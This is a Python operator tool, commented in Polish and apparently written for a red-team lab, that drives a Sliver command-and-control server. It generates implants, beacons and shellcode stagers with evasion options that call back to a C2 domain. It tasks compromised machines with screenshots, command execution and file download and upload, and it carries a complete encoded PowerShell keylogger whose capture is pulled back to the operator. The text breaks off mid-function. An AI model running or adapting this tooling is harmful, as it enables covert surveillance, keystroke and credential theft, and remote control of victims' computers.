#!/usr/bin/env python3
"""sliver_ops.py — operator CLI for the lab Sliver server (v1.7.3, sliver-py).

Pełny operator: implanty (profiles/generate/regenerate), stagers, tasking
(screenshot / keylog / exec / download / upload / ls / ps / ...), kill/rename
sesji i beaconów — z logiem do Obsidian.

Zakres: WYŁĄCZNIE autoryzowany lab (XMask). Każda operacja trafia do:
  - <VAULT>/Logs/sliver_ops/ops.jsonl           (log maszynowy)
  - <VAULT>/Daily/YYYY-MM-DD.md                 (wpis dzienny)
Destrukcyjne operacje (kill, regenerate, profile-delete, build-delete,
stager-start) wymagają --yes. Nie dumpujemy credentials ani kluczy implantu.

Przykłady:
  sliver_ops.py sessions
  sliver_ops.py profiles
  sliver_ops.py generate --name lab01 --os windows --arch amd64 \
      --c2-https https://c2.maskencrypt.eu --beacon --interval 60 --jitter 10
  sliver_ops.py profile-save web_beacon --os windows --arch amd64 \
      --c2-https https://c2.maskencrypt.eu --beacon --interval 60
  sliver_ops.py task <SESSION_ID> screenshot
  sliver_ops.py task <SESSION_ID> keylog --duration 20
  sliver_ops.py task <SESSION_ID> download C:/tmp/x.txt
  sliver_ops.py kill <SESSION_ID> --yes
  sliver_ops.py audit --tail 20
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

VAULT_CANDIDATES = [
    os.environ.get("OBSIDIAN_VAULT", ""),
    "/root/obsidian-vault",
    "/root/Obsidian/XMask/maldev2",
]
CONFIG_CANDIDATES = [
    os.environ.get("SLIVER_CLIENT_CONFIG", ""),
    "/root/.sliver-client/configs/root_127.0.0.1.cfg",
    "/root/.sliver-client/configs/local_127.0.0.1.cfg",
]

FORMATS = {"sharedlib": 0, "shellcode": 1, "exe": 2, "service": 3, "external": 4}
FORMAT_NAMES = {v: k for k, v in FORMATS.items()}
# Format string jest potrzebny tylko do zapisu pliku z właściwym rozszerzeniem.
FORMAT_EXT = {0: "dll", 1: "bin", 2: "exe", 3: "exe", 4: ""}

# Wrażliwe pola nie trafiają do logu Obsidian (higiena jak w log_to_obsidian.sh).
_SECRET_RE = re.compile(r"(passw(or)?d|token|api[_-]?key|BEGIN (OPENSSH|RSA|EC) PRIVATE)", re.I)


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def find_vault() -> Path:
    for cand in VAULT_CANDIDATES:
        if cand and Path(cand).is_dir():
            return Path(cand)
    return Path.cwd()


def find_config() -> Path:
    for cand in CONFIG_CANDIDATES:
        if cand and Path(cand).is_file():
            return Path(cand)
    raise FileNotFoundError("brak operator cfg — ustaw SLIVER_CLIENT_CONFIG")


class OpsLog:
    """Log operacji: ops.jsonl + wpis w Daily/YYYY-MM-DD.md."""

    def __init__(self, vault: Path, no_log: bool = False):
        self.vault = Path(vault)
        self.no_log = no_log
        self.ops_dir = self.vault / "Logs" / "sliver_ops"
        self.artifacts = self.ops_dir / "artifacts"
        self.ops_jsonl = self.ops_dir / "ops.jsonl"
        self.daily_dir = self.vault / "Daily"
        if not no_log:
            self.ops_dir.mkdir(parents=True, exist_ok=True)
            self.artifacts.mkdir(parents=True, exist_ok=True)
            self.daily_dir.mkdir(parents=True, exist_ok=True)

    def _sanitize(self, text: str) -> str:
        return "\n".join(
            line for line in text.splitlines() if not _SECRET_RE.search(line)
        )

    def record(self, op: str, target: str = "", ok: bool = True,
               detail: Optional[dict] = None, note: str = "") -> None:
        if self.no_log:
            return
        entry = {
            "ts": now_iso(),
            "op": op,
            "target": target,
            "ok": bool(ok),
            "detail": detail or {},
            "note": note,
        }
        with self.ops_dir.joinpath("ops.jsonl").open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def daily(self, heading: str, body: str) -> Path:
        if self.no_log:
            return Path("")
        day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        stamp = now_iso()
        target = self.daily_dir / f"{day}.md"
        if not target.exists():
            target.write_text(
                f"---\ndate: {day}\ntags: [daily]\n---\n\n# {day}\n\n",
                encoding="utf-8",
            )
        safe_body = self._sanitize(body).strip()
        with target.open("a", encoding="utf-8") as fh:
            fh.write(f"\n## {heading} ({stamp})\n\n{safe_body}\n\n")
        return target


def _unix(value) -> float:
    if not value:
        return 0.0
    try:
        n = float(value)
    except (TypeError, ValueError):
        return 0.0
    return n / 1e9 if n > 1e12 else n


def _iso(value) -> str:
    ts = _unix(value)
    if ts <= 0:
        return ""
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


def _ago(value) -> str:
    ts = _unix(value)
    if ts <= 0:
        return "brak"
    delta = max(0, int(datetime.now(timezone.utc).timestamp() - ts))
    if delta < 45:
        return "przed chwilą"
    if delta < 3600:
        return f"{delta // 60} min temu"
    if delta < 86400:
        return f"{delta // 3600} godz. temu"
    return f"{delta // 86400} d. temu"


def _health(dead: bool, last, interval_ns=0, jitter_ns=0, session=True) -> str:
    if dead:
        return "dead"
    ts = _unix(last)
    if ts <= 0:
        return "stale"
    age = datetime.now(timezone.utc).timestamp() - ts
    if session:
        return "live" if age <= 180 else "stale"
    interval = (float(interval_ns or 0) / 1e9) or 60.0
    jitter = (float(jitter_ns or 0) / 1e9)
    limit = max(180.0, 3.0 * interval + jitter)
    return "live" if age <= limit else "stale"


async def connect(cfg_path: Path):
    from sliver import SliverClient, SliverClientConfig

    client = SliverClient(SliverClientConfig.parse_config_file(str(cfg_path)))
    await client.connect()
    return client


# ---------------------------------------------------------------- helpers

# ---- Sliver v1.7.1 wire codec (clientpb) ----
# sliver-py 0.0.19 ma protobufy starego Slivera (v1.5): w ImplantConfig pola są
# przesunięte (GOOS 5→7, IsBeacon 2→4, doszedł ImplantBuilds=2 itd.) i nie ma
# GenerateReq.Name=2. Dla generate/profile/stager kodujemy wire-format ręcznie
# wg protobuf/clientpb/client.proto v1.7.1 (zweryfikowane 2026-08-16).

def _w_varint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def _w_vi(field: int, n: int) -> bytes:
    return _w_varint((field << 3) | 0) + _w_varint(n)


def _w_ld(field: int, data: bytes) -> bytes:
    return _w_varint((field << 3) | 2) + _w_varint(len(data)) + data


def _enc_c2_v17(url: str, priority: int = 0) -> bytes:
    # ImplantC2 v1.7: ID=1, Priority=2, URL=3, Options=4
    return _w_vi(2, priority) + _w_ld(3, url.encode())


def enc_implant_config_v17(args) -> bytes:
    """ImplantConfig v1.7.1 — tylko pola używane przez CLI."""
    out = b""
    out += _w_vi(4, 1 if args.beacon else 0)                # IsBeacon
    if args.beacon:
        out += _w_vi(5, int(args.interval * 1e9))           # BeaconInterval
        out += _w_vi(6, int(args.jitter * 1e9))             # BeaconJitter
    out += _w_ld(7, args.os.encode())                       # GOOS
    out += _w_ld(8, args.arch.encode())                     # GOARCH
    out += _w_vi(10, 1 if args.debug else 0)                # Debug
    out += _w_vi(11, 1 if args.evasion else 0)              # Evasion
    out += _w_vi(12, 1 if args.obfuscate else 0)            # ObfuscateSymbols
    out += _w_ld(13, b"sliver")                             # TemplateName
    out += _w_vi(40, int(args.reconnect * 1e9))             # ReconnectInterval
    out += _w_vi(41, 1000)                                  # MaxConnectionErrors
    out += _w_vi(42, int(360 * 1e9))                        # PollTimeout
    for url in getattr(args, "c2", []) or []:
        out += _w_ld(50, _enc_c2_v17(url))                  # C2
    out += _w_vi(100, FORMATS.get(args.format, 2))          # Format
    out += _w_vi(103, 0)                                    # IsService
    out += _w_vi(104, 0)                                    # IsShellcode
    out += _w_ld(150, b"default")                           # HTTPC2ConfigName
    return out


def enc_generate_req_v17(cfg_bytes: bytes, build_name: str) -> bytes:
    # GenerateReq v1.7: Config=1, Name=2
    return _w_ld(1, cfg_bytes) + _w_ld(2, build_name.encode())


def enc_implant_profile_v17(name: str, cfg_bytes: bytes) -> bytes:
    # ImplantProfile v1.7: ID=1, Name=2, Config=3
    return _w_ld(2, name.encode()) + _w_ld(3, cfg_bytes)


def enc_stager_req_v17(protocol: int, host: str, port: int,
                       data: bytes, profile: str) -> bytes:
    # StagerListenerReq v1.7: Protocol=1, Host=2, Port=3, Data=4, ProfileName=5
    return (_w_vi(1, protocol) + _w_ld(2, host.encode()) + _w_vi(3, port)
            + _w_ld(4, data) + _w_ld(5, profile.encode()))


def _r_varint(data: bytes, i: int) -> tuple:
    shift, val = 0, 0
    while True:
        b = data[i]
        i += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80):
            return val, i
        shift += 7


def _iter_fields(data: bytes):
    i = 0
    while i < len(data):
        tag, i = _r_varint(data, i)
        field, wire = tag >> 3, tag & 7
        if wire == 0:
            val, i = _r_varint(data, i)
            yield field, val, b""
        elif wire == 2:
            ln, i = _r_varint(data, i)
            val = data[i:i + ln]
            i += ln
            yield field, val, val
        else:
            break


def dec_config_v17(data: bytes) -> dict:
    cfg = {"goos": "", "goarch": "", "format": None, "is_beacon": False, "c2": []}
    for field, raw, raw_bytes in _iter_fields(data):
        if field == 4:
            cfg["is_beacon"] = bool(raw)
        elif field == 7:
            cfg["goos"] = raw_bytes.decode(errors="replace")
        elif field == 8:
            cfg["goarch"] = raw_bytes.decode(errors="replace")
        elif field == 100:
            cfg["format"] = raw
        elif field == 50:
            for f2, _, vb2 in _iter_fields(raw_bytes):
                if f2 == 3:
                    cfg["c2"].append(vb2.decode(errors="replace"))
    return cfg


def dec_profiles_v17(data: bytes) -> list[dict]:
    profiles = []
    for field, raw, raw_bytes in _iter_fields(data):
        if field == 1:  # repeated ImplantProfile
            pid = pname = ""
            for f2, _, vb2 in _iter_fields(raw_bytes):
                if f2 == 1:
                    pid = vb2.decode(errors="replace")
                elif f2 == 2:
                    pname = vb2.decode(errors="replace")
                elif f2 == 3:
                    profiles.append({"id": pid, "name": pname,
                                     "config": dec_config_v17(vb2)})
    return profiles


def dec_builds_v17(data: bytes) -> list[dict]:
    builds = []
    for field, raw, raw_bytes in _iter_fields(data):
        if field == 1:  # map<string, ImplantConfig> -> wpis {key=1, value=2}
            key = ""
            value = b""
            for f2, _, vb2 in _iter_fields(raw_bytes):
                if f2 == 1:
                    key = vb2.decode(errors="replace")
                elif f2 == 2:
                    value = vb2
            if key:
                builds.append({"name": key, **dec_config_v17(value)})
    return builds


async def _raw_rpc(client, path: str, req_bytes: bytes, deserializer):
    call = client._channel.unary_unary(
        path,
        request_serializer=lambda b: b,
        response_deserializer=deserializer,
    )
    return await call(req_bytes, timeout=360)


async def _resolve_target(client, target: str) -> tuple:
    """Zwraca (kind, obj) gdzie kind to 'session'|'beacon'."""
    target = target.lower()
    sessions = await client.sessions() or []
    beacons = await client.beacons() or []
    for s in sessions:
        if target in s.ID.lower() or target in s.Name.lower():
            return "session", s
    for b in beacons:
        if target in b.ID.lower() or target in b.Name.lower():
            return "beacon", b
    return None, None


def _session_row(obj, kind: str) -> dict:
    dead = bool(getattr(obj, "IsDead", False))
    last = getattr(obj, "LastCheckin", 0)
    interval = int(getattr(obj, "Interval", 0) or 0)
    jitter = int(getattr(obj, "Jitter", 0) or 0)
    return {
        "id": (getattr(obj, "ID", "") or "").split("-", 1)[0],
        "id_full": getattr(obj, "ID", "") or "",
        "name": getattr(obj, "Name", "") or "",
        "hostname": getattr(obj, "Hostname", "") or "",
        "username": getattr(obj, "Username", "") or "",
        "os": getattr(obj, "OS", "") or "",
        "arch": getattr(obj, "Arch", "") or "",
        "transport": getattr(obj, "Transport", "") or "",
        "remote": getattr(obj, "RemoteAddress", "") or "",
        "pid": int(getattr(obj, "PID", 0) or 0),
        "process": getattr(obj, "Filename", "") or "",
        "last_checkin": _iso(last),
        "last_ago": _ago(last),
        "dead": dead,
        "health": _health(dead, last, interval, jitter, session=(kind == "session")),
        "kind": kind,
    }


def _print_table(rows: list[dict], cols: list[str], headers: dict) -> None:
    widths = {c: len(headers[c]) for c in cols}
    for r in rows:
        for c in cols:
            widths[c] = max(widths[c], len(str(r.get(c, ""))))
    line = "  ".join(headers[c].ljust(widths[c]) for c in cols)
    print(line)
    print("  ".join("-" * widths[c] for c in cols))
    for r in rows:
        print("  ".join(str(r.get(c, "")).ljust(widths[c]) for c in cols))


# ---------------------------------------------------------------- actions

async def action_version(client, args, log: OpsLog) -> int:
    v = await client.version()
    print(f"Sliver {v.Major}.{v.Minor}.{v.Patch} ({v.Commit}) {v.OS}/{v.Arch}")
    return 0


async def action_sessions(client, args, log: OpsLog) -> int:
    rows = [_session_row(s, "session") for s in (await client.sessions() or [])]
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    if not rows:
        print("brak sesji")
        return 0
    _print_table(rows, ["id", "name", "hostname", "username", "os", "arch",
                        "transport", "remote", "pid", "process", "last_ago", "health"],
                 {"id": "ID", "name": "Name", "hostname": "Hostname", "username": "User",
                  "os": "OS", "arch": "Arch", "transport": "Transport", "remote": "Remote",
                  "pid": "PID", "process": "Process", "last_ago": "Last check-in",
                  "health": "Health"})
    return 0


async def action_beacons(client, args, log: OpsLog) -> int:
    rows = [_session_row(b, "beacon") for b in (await client.beacons() or [])]
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    if not rows:
        print("brak beaconów")
        return 0
    _print_table(rows, ["id", "name", "hostname", "username", "os", "arch",
                        "transport", "remote", "process", "last_ago", "health"],
                 {"id": "ID", "name": "Name", "hostname": "Hostname", "username": "User",
                  "os": "OS", "arch": "Arch", "transport": "Transport", "remote": "Remote",
                  "process": "Process", "last_ago": "Last check-in", "health": "Health"})
    return 0


async def action_jobs(client, args, log: OpsLog) -> int:
    jobs = await client.jobs() or []
    if not jobs:
        print("brak jobów")
        return 0
    rows = [{"id": j.ID, "name": j.Name, "protocol": j.Protocol, "port": j.Port,
             "domains": ",".join(d for d in (j.Domains or []) if d)} for j in jobs]
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    _print_table(rows, ["id", "name", "protocol", "port", "domains"],
                 {"id": "ID", "name": "Name", "protocol": "Protocol", "port": "Port",
                  "domains": "Domains"})
    return 0


async def action_jobs_kill(client, args, log: OpsLog) -> int:
    job = await client.job_by_id(args.job_id)
    if job is None:
        print(f"brak joba {args.job_id}")
        return 1
    if not args.yes:
        print(f"job {args.job_id} ({job.Name}:{job.Port}) — potwierdź --yes")
        return 2
    await client.kill_job(args.job_id)
    log.record("jobs-kill", target=str(args.job_id), note=f"zabito job {job.Name}:{job.Port}")
    log.daily(f"Sliver — zabito listener job {args.job_id}",
              f"`{job.Name}` :{job.Port} zatrzymany.")
    print(f"zabito job {args.job_id}")
    return 0


async def action_profiles(client, args, log: OpsLog) -> int:
    resp = await _raw_rpc(client, "/rpcpb.SliverRPC/ImplantProfiles", b"",
                          lambda b: b)
    profiles = dec_profiles_v17(resp)
    if not profiles:
        print("brak profilów")
        return 0
    rows = []
    for p in profiles:
        c = p.get("config", {})
        rows.append({
            "name": p.get("name", ""), "os": c.get("goos", ""),
            "arch": c.get("goarch", ""),
            "beacon": "beacon" if c.get("is_beacon") else "session",
            "format": FORMAT_NAMES.get(c.get("format"), str(c.get("format") or "")),
            "c2": ",".join(c.get("c2", [])),
        })
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    _print_table(rows, ["name", "os", "arch", "beacon", "format", "c2"],
                 {"name": "Name", "os": "OS", "arch": "Arch", "beacon": "Typ",
                  "format": "Format", "c2": "C2"})
    return 0


async def action_profile_save(client, args, log: OpsLog) -> int:
    if not args.c2:
        print("podaj co najmniej jedno --c2-* (adres C2)")
        return 2
    cfg_bytes = enc_implant_config_v17(args)
    req = enc_implant_profile_v17(args.name, cfg_bytes)
    resp = await _raw_rpc(client, "/rpcpb.SliverRPC/SaveImplantProfile", req,
                          lambda b: b)
    saved_name = args.name
    for f2, _, vb2 in _iter_fields(resp):
        if f2 == 2:
            saved_name = vb2.decode(errors="replace")
    log.record("profile-save", target=args.name,
               detail={"os": args.os, "arch": args.arch, "beacon": args.beacon,
                       "c2": args.c2})
    log.daily(f"Sliver — zapisano profil implantu `{args.name}`",
              f"`{args.os}/{args.arch}` {'beacon' if args.beacon else 'session'}, "
              f"C2: {', '.join(args.c2)}.")
    print(f"zapisano profil {saved_name}")
    return 0


async def action_profile_delete(client, args, log: OpsLog) -> int:
    if not args.yes:
        print("potwierdź --yes")
        return 2
    await client.delete_implant_profile(args.name)
    log.record("profile-delete", target=args.name)
    log.daily(f"Sliver — usunięto profil implantu `{args.name}`", "")
    print(f"usunięto profil {args.name}")
    return 0


async def action_builds(client, args, log: OpsLog) -> int:
    resp = await _raw_rpc(client, "/rpcpb.SliverRPC/ImplantBuilds", b"",
                          lambda b: b)
    builds = dec_builds_v17(resp)
    if not builds:
        print("brak buildów")
        return 0
    rows = [{"name": b.get("name", ""), "os": b.get("goos", ""),
             "arch": b.get("goarch", ""),
             "format": FORMAT_NAMES.get(b.get("format"), str(b.get("format") or "")),
             "beacon": "beacon" if b.get("is_beacon") else "session",
             "c2": ",".join(b.get("c2", []))}
            for b in builds]
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    _print_table(rows, ["name", "os", "arch", "format", "beacon", "c2"],
                 {"name": "Name", "os": "OS", "arch": "Arch", "format": "Format",
                  "beacon": "Typ", "c2": "C2"})
    return 0


async def action_build_delete(client, args, log: OpsLog) -> int:
    if not args.yes:
        print("potwierdź --yes")
        return 2
    await client.delete_implant_build(args.name)
    log.record("build-delete", target=args.name)
    print(f"usunięto build {args.name}")
    return 0


async def _do_generate(client, args, log: OpsLog) -> int:
    from sliver.pb.clientpb import client_pb2

    if args.dry_run:
        print(json.dumps({
            "dry_run": True,
            "name": args.name, "os": args.os, "arch": args.arch,
            "format": args.format,
            "beacon": args.beacon,
            "interval_s": args.interval if args.beacon else 0,
            "jitter_s": args.jitter if args.beacon else 0,
            "obfuscate": args.obfuscate, "evasion": args.evasion,
            "c2": args.c2,
        }, ensure_ascii=False, indent=2))
        log.record("generate-dry-run", target=args.name,
                   detail={"os": args.os, "arch": args.arch})
        return 0

    if not args.yes:
        print("generowanie implantu — potwierdź --yes (lab scope)")
        return 2

    if args.profile:
        # konfiguracja z profilu: pobierz i nadpisz nazwę/GOOS/GOARCH
        resp_p = await _raw_rpc(client, "/rpcpb.SliverRPC/ImplantProfiles", b"",
                                lambda b: b)
        profiles = dec_profiles_v17(resp_p)
        match = next((p for p in profiles if p["name"] == args.profile), None)
        if match is None:
            print(f"brak profilu {args.profile}")
            return 1
        cfg = match.get("config", {})
        args.os = args.os or cfg.get("goos", "windows")
        args.arch = args.arch or cfg.get("goarch", "amd64")
        args.format = FORMAT_NAMES.get(cfg.get("format"), args.format)
        args.beacon = bool(cfg.get("is_beacon"))
        args.c2 = cfg.get("c2", []) or args.c2
        if not args.c2:
            print(f"profil {args.profile} nie ma C2")
            return 1

    if not args.c2:
        print("podaj co najmniej jedno --c2-* albo --profile")
        return 2

    cfg_bytes = enc_implant_config_v17(args)
    req = enc_generate_req_v17(cfg_bytes, args.name)
    print(f"[*] generowanie {args.os}/{args.arch} '{args.name}' "
          f"({'beacon' if args.beacon else 'session'})…")
    gen = await _raw_rpc(client, "/rpcpb.SliverRPC/Generate", req,
                         client_pb2.Generate.FromString)
    data = bytes(gen.File.Data)
    ext = FORMAT_EXT.get(FORMATS.get(args.format, 2), "")
    save_dir = Path(args.save) if args.save else log.artifacts
    save_dir.mkdir(parents=True, exist_ok=True)
    out = save_dir / f"{args.name}.{ext}" if ext else save_dir / args.name
    out.write_bytes(data)
    sha = __import__("hashlib").sha256(data).hexdigest()
    log.record("generate", target=args.name, ok=True,
               detail={"os": args.os, "arch": args.arch, "format": args.format,
                       "beacon": args.beacon, "size": len(data), "sha256": sha,
                       "path": str(out)})
    log.daily(f"Sliver — wygenerowano implant `{args.name}`",
              f"`{args.os}/{args.arch}` {'beacon' if args.beacon else 'session'}, "
              f"format `{args.format}`, {len(data)} B, "
              f"sha256 `{sha[:16]}…`\nZapis: `{out}`")
    print(f"[+] zapisano: {out} ({len(data)} B, sha256 {sha[:16]}…)")
    return 0


async def action_regenerate(client, args, log: OpsLog) -> int:
    if not args.yes:
        print("regeneracja builda — potwierdź --yes")
        return 2
    gen = await client.regenerate_implant(args.name)
    data = bytes(gen.File.Data)
    save_dir = Path(args.save) if args.save else log.artifacts
    save_dir.mkdir(parents=True, exist_ok=True)
    out = save_dir / gen.File.Name
    out.write_bytes(data)
    sha = __import__("hashlib").sha256(data).hexdigest()
    log.record("regenerate", target=args.name,
               detail={"size": len(data), "sha256": sha, "path": str(out)})
    log.daily(f"Sliver — regenerowano implant `{args.name}`",
              f"{len(data)} B, sha256 `{sha[:16]}…`, zapis `{out}`")
    print(f"[+] zapisano: {out} ({len(data)} B)")
    return 0


async def action_stager_start(client, args, log: OpsLog) -> int:
    from sliver.pb.clientpb import client_pb2

    if not args.yes:
        print("start stager listenera — potwierdź --yes")
        return 2
    # 1) shellcode z profilu (v1.7 — StagerListenerReq niesie ProfileName)
    resp_p = await _raw_rpc(client, "/rpcpb.SliverRPC/ImplantProfiles", b"",
                            lambda b: b)
    profiles = dec_profiles_v17(resp_p)
    match = next((p for p in profiles if p["name"] == args.profile), None)
    if match is None:
        print(f"brak profilu {args.profile}")
        return 1
    cfg = match.get("config", {})
    if cfg.get("format") != FORMATS["shellcode"]:
        print(f"profil {args.profile} nie jest shellcode "
              f"(format={cfg.get('format')}) — utwórz profil z --format shellcode")
        return 1
    # 2) listener stager (StageProtocol: TCP=0, HTTP=1, HTTPS=2)
    proto = {"tcp": 0, "http": 1, "https": 2}.get(args.protocol)
    if proto is None:
        print(f"nieznany protokół {args.protocol}")
        return 2
    req = enc_stager_req_v17(proto, args.host, args.port, b"", args.profile)
    rpc_name = f"Start{args.protocol.upper()}StagerListener"
    resp = await _raw_rpc(client, f"/rpcpb.SliverRPC/{rpc_name}", req,
                          client_pb2.StagerListener.FromString)
    log.record("stager-start", target=args.profile,
               detail={"protocol": args.protocol, "host": args.host, "port": args.port})
    log.daily(f"Sliver — start stager listenera ({args.protocol})",
              f"`{args.host}:{args.port}` dla profilu `{args.profile}` (job {resp.JobID}).")
    print(f"[+] stager {args.protocol} na {args.host}:{args.port} (job id {resp.JobID})")
    return 0


# ---------------------------------------------------------------- tasking

KEYLOG_PS = r"""
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class KL{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);}'
$log = Join-Path $env:TEMP ('sliver_keylog_{0}.txt' -f (Get-Date -Format yyyyMMdd_HHmmss))
$end = (Get-Date).AddSeconds({duration})
while ((Get-Date) -lt $end) {{
  Start-Sleep -Milliseconds 30
  for ($k = 8; $k -le 190; $k++) {{
    if (([KL]::GetAsyncKeyState($k) -band 1) -eq 1) {{
      $ch = ''
      if ($k -ge 32 -and $k -le 126) {{ $ch = [char]$k }}
      Add-Content -Path $log -Value ('{0:HH:mm:ss.fff} VK=0x{1:X2} {2}' -f (Get-Date), $k, $ch)
    }}
  }}
}}
Write-Output $log
"""


async def _task_obj(client, target):
    kind, obj = await _resolve_target(client, target)
    if kind == "session":
        return await client.interact_session(obj.ID)
    if kind == "beacon":
        return await client.interact_beacon(obj.ID)
    return None


async def action_task(client, args, log: OpsLog) -> int:
    obj = await _task_obj(client, args.target)
    if obj is None:
        print(f"brak sesji/beacona: {args.target}")
        return 1
    action = args.action
    detail: dict = {}

    if action == "ping":
        r = await obj.ping()
        print(f"pong ({r.Nonce})" if r else "brak odpowiedzi")
        detail = {"nonce": getattr(r, "Nonce", "")}
    elif action == "screenshot":
        r = await obj.screenshot()
        data = bytes(r.Data)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        save_dir = Path(args.save) if args.save else log.artifacts
        save_dir.mkdir(parents=True, exist_ok=True)
        out = save_dir / f"screenshot_{args.target}_{stamp}.png"
        out.write_bytes(data)
        sha = __import__("hashlib").sha256(data).hexdigest()
        print(f"[+] screenshot: {out} ({len(data)} B, sha256 {sha[:16]}…)")
        detail = {"size": len(data), "sha256": sha, "path": str(out)}
    elif action == "keylog":
        duration = int(args.duration)
        ps = KEYLOG_PS.format(duration=duration)
        b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
        r = await obj.execute("powershell.exe",
                              ["-NoProfile", "-NonInteractive", "-EncodedCommand", b64])
        stdout = (r.Stdout or "").strip()
        log_path = stdout.splitlines()[-1] if stdout else ""
        if not log_path:
            print(f"keylogger nie zwrócił ścieżki logu. stdout={stdout!r} stderr={r.Stderr!r}")
            return 1
        dl = await obj.download(log_path)
        data = bytes(dl.Data)
        save_dir = Path(args.save) if args.save else log.artifacts
        save_dir.mkdir(parents=True, exist_ok=True)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        out = save_dir / f"keylog_{args.target}_{stamp}.txt"
        out.write_bytes(data)
        print(f"[+] keylog: {out} ({len(data)} B) — źródło {log_path}")
        detail = {"source": log_path, "size": len(data), "path": str(out)}
    elif action == "exec":
        if not args.command:
            print("podaj --cmd")
            return 2
        r = await obj.execute(args.command, args.args or None)
        print((r.Stdout or "").rstrip())
        if r.Stderr:
            print("STDERR:", (r.Stderr or "").rstrip(), file=sys.stderr)
        detail = {"cmd": args.command, "args": args.args or [], "exit": r.Status}
    elif action == "ps":
        procs = await obj.ps()
        for p in sorted(procs, key=lambda x: x.Pid):
            print(f"{p.Pid:>7}  {p.PPID:>7}  {p.Owner or '':<20} {p.Executable or p.Name or ''}")
        detail = {"count": len(procs)}
    elif action == "ls":
        r = await obj.ls(args.path or ".")
        if not r.Exists:
            print(f"nie istnieje: {r.Path}")
            return 1
        files = sorted(r.Files, key=lambda f: f.Name.lower())
        for f in files:
            kind = "dir" if f.IsDir else f"{f.Size} B"
            print(f"{f.Name:<40} {kind}")
        detail = {"path": r.Path, "count": len(files)}
    elif action == "pwd":
        r = await obj.pwd()
        print(r.Path)
        detail = {"path": r.Path}
    elif action == "cd":
        r = await obj.cd(args.path)
        print(f"cd → {r.Path}")
        detail = {"path": r.Path}
    elif action == "download":
        r = await obj.download(args.remote, recurse=args.recurse)
        if not r.Exists:
            print(f"nie istnieje: {args.remote}")
            return 1
        data = bytes(r.Data)
        save_dir = Path(args.save) if args.save else log.artifacts
        save_dir.mkdir(parents=True, exist_ok=True)
        name = Path(r.Path).name or "download.bin"
        out = save_dir / name
        out.write_bytes(data)
        sha = __import__("hashlib").sha256(data).hexdigest()
        print(f"[+] download: {out} ({len(data)} B, sha256 {sha[:16]}…)")
        detail = {"source": args.remote, "size": len(data), "sha256": sha, "path": str(out)}
    elif action == "upload":
        data = Path(args.local).read_bytes()
        r = await obj.upload(args.remote, data)
        print(f"[+] upload → {r.Path}")
        detail = {"remote": args.remote, "size": len(data)}
    elif action == "ifconfig":
        r = await obj.ifconfig()
        for ni in r.NetInterfaces:
            print(f"{ni.Name}: {','.join(ni.IPAddresses)} MAC={ni.MAC}")
        detail = {"interfaces": len(r.NetInterfaces)}
    elif action == "netstat":
        r = await obj.netstat(tcp=args.tcp, udp=args.udp, ipv4=True, ipv6=True,
                              listening=not args.no_listening)
        for e in r.Entries:
            print(f"{e.Protocol:<4} {e.LocalAddr:<28} {e.RemoteAddr:<28} {e.Process if hasattr(e,'Process') else ''} {e.State if hasattr(e,'State') else ''}")
        detail = {"count": len(r.Entries)}
    else:
        print(f"nieznana akcja: {action}")
        return 2

    log.record(f"task-{action}", target=args.target, detail=detail)
    body = f"`{action}` na `{args.target}`: " + "; ".join(
        f"{k}={v}" for k, v in detail.items() if k not in ("cmd", "args"))
    if action == "exec" and detail.get("cmd"):
        body = f"exec `{detail['cmd']}` na `{args.target}` (exit {detail.get('exit')})"
    log.daily(f"Sliver — task `{action}` → {args.target}", body)
    return 0


# ---------------------------------------------------------------- kill/rename

async def action_kill(client, args, log: OpsLog) -> int:
    kind, obj = await _resolve_target(client, args.target)
    if obj is None:
        print(f"brak sesji/beacona: {args.target}")
        return 1
    if not args.yes:
        print(f"kill {kind} {args.target} — potwierdź --yes")
        return 2
    if kind == "session":
        await client.kill_session(obj.ID, force=args.force)
    else:
        await client.kill_beacon(obj.ID)
    log.record("kill", target=args.target, detail={"kind": kind, "force": args.force})
    log.daily(f"Sliver — killed {kind} `{args.target}`", "")
    print(f"[+] killed {kind} {args.target}")
    return 0


async def action_rename(client, args, log: OpsLog) -> int:
    kind, obj = await _resolve_target(client, args.target)
    if obj is None:
        print(f"brak sesji/beacona: {args.target}")
        return 1
    if kind == "session":
        await client.rename_session(obj.ID, args.name)
    else:
        await client.rename_beacon(obj.ID, args.name)
    log.record("rename", target=args.target, detail={"kind": kind, "new": args.name})
    log.daily(f"Sliver — renamed {kind} `{args.target}` → `{args.name}`", "")
    print(f"[+] renamed {kind} {args.target} → {args.name}")
    return 0


# ---------------------------------------------------------------- audit/log

async def action_audit(client, args, log: OpsLog) -> int:
    audit_path = Path(os.environ.get("SLIVER_AUDIT_LOG", "/root/.sliver/logs/audit.json"))
    if not audit_path.is_file():
        print(f"brak audit.log: {audit_path}")
        return 1
    lines = audit_path.read_text(encoding="utf-8", errors="replace").splitlines()
    if args.tail:
        lines = lines[-args.tail:]
    rows = []
    for line in lines:
        try:
            e = json.loads(line)
        except json.JSONDecodeError:
            continue
        method = (e.get("msg") or {}).get("method", "") if isinstance(e.get("msg"), dict) else ""
        if not method:
            try:
                inner = json.loads(e.get("msg", "{}"))
                method = inner.get("method", "")
            except (json.JSONDecodeError, TypeError):
                method = ""
